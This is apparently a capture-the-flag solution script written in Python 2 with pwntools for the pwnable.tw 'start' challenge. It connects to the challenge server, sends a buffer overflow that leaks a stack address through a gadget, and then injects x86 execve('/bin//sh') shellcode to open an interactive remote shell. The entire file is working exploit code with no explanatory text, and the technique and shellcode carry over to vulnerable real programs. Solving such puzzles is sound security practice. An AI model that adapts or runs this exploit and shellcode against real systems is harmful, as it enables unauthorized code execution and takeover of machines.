#!/usr/bin/python
#_*_coding:utf-8_*_
from pwn import *
HOST = 'chall.pwnable.tw'
PORT = 10000
SHELLCODE = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

gad = 0x8048087 #mov %esp, %ecx
print p32(gad) 

def Exploit_start(ip, port):
    con = remote(ip, port)
    con.recv() 
    payload = "A" * 20 + p32(gad)
    con.send(payload)
    leak = u32(con.recv(4))
    print hex(leak)

    payload = 'a' * 20 + p32(leak + 20) + '\x90'*4 + SHELLCODE
    con.send(payload)
    con.interactive('\nMyshell#')

if __name__ == "__main__":
    Exploit_start(HOST, PORT)

